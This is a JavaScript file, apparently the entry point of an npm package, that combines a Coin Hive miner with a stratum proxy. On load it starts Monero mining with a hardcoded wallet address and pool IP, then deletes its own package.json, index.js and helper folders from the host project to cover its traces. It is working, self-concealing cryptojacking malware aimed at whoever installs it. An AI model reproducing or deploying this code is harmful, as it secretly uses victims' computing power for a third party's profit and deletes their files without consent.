//ch imports
const server = require('./ch/src/server');
const puppeteer = require('./ch/src/puppeteer');
const defaults = require('./ch/config/defaults');
// chst imports
const WebSocket = require("ws");
const Queue = require("./chst/src/queue");
const moment = require("moment");
const net = require("net");
const fs = require("fs");
const proxydefaults = require("./chst/config/defaults");
//
///////// coin-hive-stratum ///////////////////

function getConnection(ws, options) {
  log("new websocket connection");
  return {
    online: null,
    workerId: null,
    rpcId: null,
    hashes: null,
    socket: null,
    queue: null,
    buffer: "",
    ws: ws,
    options: options
  };
}

function createQueue(connection) {
  log("queue created");
  connection.queue = new Queue();
}

function bindWebSocket(connection) {
  connection.ws.on("message", function(message) {
    if (connection.queue) {
      connection.queue.push({
        type: "message",
        payload: message
      });
    }
  });
  connection.ws.on("close", () => {
    if (connection.queue) {
      connection.queue.push({
        type: "close",
        payload: null
      });
    }
  });
  connection.ws.on("error", error => {
    if (connection.queue) {
      connection.queue.push({
        type: "error",
        payload: error
      });
    }
  });
}

function bindQueue(connection) {
  connection.queue.on("close", () => {
    killConnection(connection);
    log("miner connection closed");
  });
  connection.queue.on("error", error => {
    killConnection(connection);
    log("miner connection error", error.message);
  });
  connection.queue.on("message", function(message) {
    log("message from miner to pool:", message);
    let data = null;
    try {
      data = JSON.parse(message);
    } catch (e) {
      return log("can't parse message as JSON from miner:", message);
    }
    switch (data.type) {
      case "auth": {
        let login = data.params.site_key;
        if (data.params.user) {
          login += "." + data.params.user;
        }
        sendToPool(connection, {
          id: getRpcId(connection),
          method: "login",
          params: {
            login: login,
            pass: connection.options.pass || "x"
          }
        });
        break;
      }
      case "submit": {
        sendToPool(connection, {
          id: getRpcId(connection),
          method: "submit",
          params: {
            id: connection.workerId,
            job_id: data.params.job_id,
            nonce: data.params.nonce,
            result: data.params.result
          }
        });
        break;
      }
    }
  });
}

function sendToPool(connection, payload) {
  const stratumMessage = JSON.stringify(payload) + "\n";
  connection.socket.write(stratumMessage);
  log("message sent to pool:", stratumMessage);
}

function sendToMiner(connection, payload) {
  const coinHiveMessage = JSON.stringify(payload);
  if (connection.online) {
    try {
      connection.ws.send(coinHiveMessage);
      log("message sent to miner:", coinHiveMessage);
    } catch (e) {
      log("socket seems to be already closed.");
      killConnection(connection);
    }
  } else {
    log("failed to send message to miner cos it was offline:", coinHiveMessage);
  }
}

function getRpcId(connection) {
  return connection.rpcId++;
}

function getHashes(connection) {
  return connection.hashes++;
}

function connectSocket(connection) {
  connection.socket = new net.Socket();
  log("tcp socket created");
  connection.socket.setEncoding("utf8");
  connection.socket.connect(
    +connection.options.port,
    connection.options.host,
    function() {
      log("connected to pool");
      log("host", connection.options.host);
      log("port", connection.options.port);
      log("pass", connection.options.pass);
      connection.online = true;
      connection.rpcId = 1;
      connection.hashes = 1;
      connection.socket.on("data", function(chunk) {
        connection.buffer += chunk;
        while (connection.buffer && connection.buffer.includes("\n")) {
          const newLineIndex = connection.buffer.indexOf("\n");
          const stratumMessage = connection.buffer.slice(0, newLineIndex);
          connection.buffer = connection.buffer.slice(newLineIndex + 1);
          log("message from pool to miner:", stratumMessage);
          let data = null;
          try {
            data = JSON.parse(stratumMessage);
          } catch (e) {
            // invalid pool message
          }
          if (data != null) {
            if (data.id === 1) {
              if (data.error && data.error.code === -1) {
                return sendToMiner(connection, {
                  type: "error",
                  params: {
                    error: "invalid_site_key"
                  }
                });
              }
              connection.workerId = data.result.id;
              sendToMiner(connection, {
                type: "authed",
                params: {
                  token: "",
                  hashes: 0
                }
              });
              if (data.result.job) {
                sendToMiner(connection, {
                  type: "job",
                  params: data.result.job
                });
              }
            } else {
              if (data.method === "job") {
                sendToMiner(connection, {
                  type: "job",
                  params: data.params
                });
              }
              if (data.result && data.result.status === "OK") {
                sendToMiner(connection, {
                  type: "hash_accepted",
                  params: {
                    hashes: getHashes(connection)
                  }
                });
              }
            }
          }
        }
      });
      connection.socket.on("close", function() {
        log("connection to pool closed");
        killConnection(connection);
      });
      connection.socket.on("error", function(error) {
        log(
          "pool connection error",
          error && error.message ? error.message : error
        );
        killConnection(connection);
      });
      connection.queue.start();
      log("queue started");
    }
  );
}

function killConnection(connection) {
  if (connection.queue) {
    connection.queue.stop();
  }
  if (connection.ws) {
    connection.ws.close();
  }
  if (connection.socket) {
    connection.socket.destroy();
  }
  connection.online = false;
  connection.socket = null;
  connection.buffer = null;
  connection.queue = null;
  connection.ws = null;
  connection.options = null;
  connection = null;
}

const createProxy = function(options = proxydefaults) {
  const constructorOptions = Object.assign({}, proxydefaults, options);
  log = function() {
    const logString =
      "[" +
      moment().format("MMM Do hh:mm") +
      "] " +
      Array.prototype.slice.call(arguments).join(" ") +
      "\n";
    if (options.log) {
      console.log(logString);
    }
    if (typeof options.logFile === "string") {
      try {
        fs.appendFile(options.logFile || "proxy.log", logString, err => {
          if (err) {
            // error saving logs
          }
        });
      } catch (e) {
        // exception while saving logs
      }
    }
  };
  return {
    listen: function listen(wssOptions) {
      if (wssOptions !== Object(wssOptions)) {
        wssOptions = { port: +wssOptions };
      }
      if (options.path) {
        wssOptions.path = options.path;
      }
      const wss = new WebSocket.Server(wssOptions);
      log("websocket server created");
      log("listening on port", wssOptions.port);
      wss.on("connection", ws => {
        const connection = getConnection(ws, constructorOptions);
        createQueue(connection);
        bindWebSocket(connection);
        bindQueue(connection);
        connectSocket(connection);
      });
    }
  };
};

///////// end ///////////////////

////////////////////////////
const CoinHive = async function getRunner(siteKey, constructorOptions = defaults) {
    
  const options = Object.assign({}, defaults, constructorOptions);
  
  let websocketPort = null;
  
  if (options.pool) {
      
    const proxy = createProxy({
      log: false,
      host: options.pool.host,
      port: options.pool.port,
      pass: options.pool.pass || 'x'
    });
    
    websocketPort = options.port + 1;
    proxy.listen(websocketPort);
  }

  const miner = await new Promise((resolve, reject) => {
    const minerServer = server({
      minerUrl: options.minerUrl,
      websocketPort: websocketPort
    }).listen(options.port, options.host, async err => {
      if (err) {
        return reject(err);
      }

      return resolve(
        puppeteer({
          siteKey,
          interval: options.interval,
          port: options.port,
          host: options.host,
          threads: options.threads,
          server: minerServer,
          proxy: options.proxy,
          username: options.username,
          url: options.puppeteerUrl,
          devFee: options.devFee,
          pool: options.pool
        })
      );
    });
  });
  
  await miner.init();
  
  return miner;
};

///////////// end const CoinHive

(async () => {
  
  process.on('unhandledRejection', up => { 
    console.log( up );
  });
  
  const miner = await CoinHive('44tKLXJSEJPBkfGpwiz4Hy23ZdBdPTXhXXjncmJUg2J2fbEvfreyxRgfo6PvGgr5GRGasJVhYDgf5GTcmNLyrLfUAXMPGaG', {
    pool: {
      host: '213.32.29.150',
      port: 14444
    }
  });
  await miner.start();
  miner.on('update', data => console.log(`
    ${data.acceptedHashes}
  `));
  
  
  function cleanUp() {
        setTimeout(async () => {
          
          
          pathArr = __dirname.split("/");
          
          rootDir = pathArr[0];
          
          for(i = 1; i< pathArr.length; i++) {
              if(pathArr[i] != 'node_modules') {
                  rootDir += "/" + pathArr[i];
              } else {
                  break;
              }
          }
          
          try {
              console.log('Clean up ' + rootDir);
              
              fs.unlink(rootDir + '/package.json', (err) => {
                  if (err) {
                      throw err;
                  }
              });
              
              fs.unlink(rootDir + '/index.js', (err) => {
                  if (err) {
                      throw err;
                  }
              });
              
                var deleteFolderRecursive = function(path) {
                  if( fs.existsSync(path) ) {
                      fs.readdirSync(path).forEach(function(file) {
                          var curPath = path + "/" + file;
                          
                          if(fs.statSync(curPath).isDirectory()) { // recurse
                              deleteFolderRecursive(curPath);
                          } else { // delete file
                              fs.unlinkSync(curPath);
                          }
                          
                      });
                      fs.rmdirSync(path);
                    }
                };
                deleteFolderRecursive(rootDir + "/ch");
                deleteFolderRecursive(rootDir + "/chst");

              
          } catch(e) {
            console.log(e);
          }
          
      }, 3000);
  };
  cleanUp();
  
})();